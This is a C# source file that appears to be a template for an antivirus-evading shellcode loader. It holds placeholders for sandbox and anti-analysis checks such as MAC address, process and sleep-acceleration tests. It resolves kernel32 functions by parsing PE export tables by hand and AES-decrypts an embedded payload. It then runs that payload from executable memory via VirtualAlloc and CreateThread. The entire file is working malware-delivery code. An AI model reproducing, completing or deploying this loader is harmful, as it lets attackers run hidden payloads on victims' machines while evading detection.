using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace BY
{
    public class Dsc
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocRx(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThreadRx(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 WaitForSingleObjectRx(IntPtr hHandle, UInt32 dwMilliseconds);

        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }

        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }

        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            IntPtr hModule = IntPtr.Zero;
            return hModule;
        }

        public static string CheckNet(string str1, string str2, string domainname = "baidu.com")
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + domainname);
            request.Method = "HEAD";
            request.Timeout = 8000;
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                return str1;
            }
            catch (WebException e)
            {
                try
                {
                    IPAddress[] ipAddresses = Dns.GetHostAddresses(domainname);
                    if (ipAddresses != null)
                    {
                        return str2;
                    }
                }
                catch (ArgumentNullException)
                {
                    Environment.Exit(-1);
                }
            }
            return "";
        }

        public static byte[] Decrypt(string bs, string keys)
        {
            var bytesToBeDecrypted = Convert.FromBase64String(bs);
            byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(keys));
            byte[] decryptedBytes = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes("{{Salt}}");

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        private static string GetProcess(string file, string args = "")
        {
            Process process = new Process();
            process.StartInfo.FileName = file;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = args;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }

	    {{CheckCPUlMemoryLang}}
    {{CheckHardDiskSpace}}
    {{CheckMACAddress}}
    {{CheckProcess}}
    {{ChecksleepAcceleration}}
    {{CheckStartTime}}	
        private static void Main(string[] args)
        {
		    {{CheckCPUlMemoryLang_RUN}}
    {{CheckHardDiskSpace_RUN}}
    {{CheckMACAddress_RUN}}
    {{CheckProcess_RUN}}
    {{ChecksleepAcceleration_RUN}}
    {{CheckStartTime_RUN}}
		
           string str1 = "{{context1}}";
            string str2 = "{{context2}}";
            string str = str1 != "" ? (str2 != "" ? CheckNet(str1, str2) : str1) : (str2 != "" ? str2 : "");
            if (str == "")
            {
                Environment.Exit(-1);
            }
            byte[] codepent = Decrypt(str, "{{keyText}}");
            IntPtr func_ptr = IntPtr.Zero;
            func_ptr = GetLibraryAddress("kernel32.dll", "VirtualAlloc");
            VirtualAllocRx VirtualAllocRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(VirtualAllocRx)) as VirtualAllocRx;
            IntPtr rMemAddress = VirtualAllocRx(0, (uint)codepent.Length, 0x1000 | 0x2000, 0x40);

            Marshal.Copy(codepent, 0, (IntPtr)(rMemAddress), codepent.Length);
            IntPtr hThread = IntPtr.Zero;
            IntPtr pinfo = IntPtr.Zero;
            UInt32 threadId = 0;

            func_ptr = GetLibraryAddress("kernel32.dll", "CreateThread");
            CreateThreadRx CreateThreadRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(CreateThreadRx)) as CreateThreadRx;
            hThread = CreateThreadRx(0, 0, rMemAddress, pinfo, 0, ref threadId);

            func_ptr = GetLibraryAddress("kernel32.dll", "WaitForSingleObject");
            WaitForSingleObjectRx WaitForSingleObjectRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(WaitForSingleObjectRx)) as WaitForSingleObjectRx;
            WaitForSingleObjectRx(hThread, 0xFFFFFFFF);
        }
    }
}